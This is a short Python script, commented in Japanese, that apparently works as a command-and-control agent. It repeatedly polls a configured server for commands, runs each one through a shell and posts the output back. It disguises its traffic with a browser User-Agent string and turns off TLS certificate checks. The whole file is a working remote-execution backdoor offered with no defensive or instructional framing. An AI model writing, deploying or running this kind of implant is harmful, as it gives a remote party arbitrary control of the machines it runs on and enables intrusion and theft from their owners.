import os
import time
import subprocess
import requests
import configparser

# 設定ファイルを読み込み
config = configparser.ConfigParser()
config.read('agent.conf')

SERVER_URL = config.get('DEFAULT', 'SERVER_URL')
CLIENT_ID = config.get('DEFAULT', 'CLIENT_ID')
POLL_INTERVAL = config.getint('DEFAULT', 'POLL_INTERVAL', fallback=10)
USERNAME = config.get('DEFAULT', 'USERNAME', fallback='agent')

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

def fetch_command():
    try:
        headers = {"User-Agent": USER_AGENT}
        r = requests.get(f"{SERVER_URL}/fetch_command", params={"id": CLIENT_ID}, headers=headers, verify=False, timeout=5)
        if r.status_code == 200:
            return r.json().get("command")
    except Exception as e:
        print("[error] fetch_command:", e)
    return None

def post_result(output):
    try:
        headers = {"User-Agent": USER_AGENT}
        r = requests.post(f"{SERVER_URL}/post_result", json={"id": CLIENT_ID, "output": output}, headers=headers, verify=False, timeout=5)
        print("[result sent]")
    except Exception as e:
        print("[error] post_result:", e)

def run():
    print(f"[started] Agent running as user: {USERNAME}")
    while True:
        print(f"[polling] {SERVER_URL} as {CLIENT_ID} (user: {USERNAME})")
        cmd = fetch_command()
        if cmd:
            print(f"[exec] {cmd}")
            try:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
                post_result(result.stdout + result.stderr)
            except Exception as e:
                post_result(f"[exec error] {e}")
        time.sleep(POLL_INTERVAL)

if __name__ == "__main__":
    run() 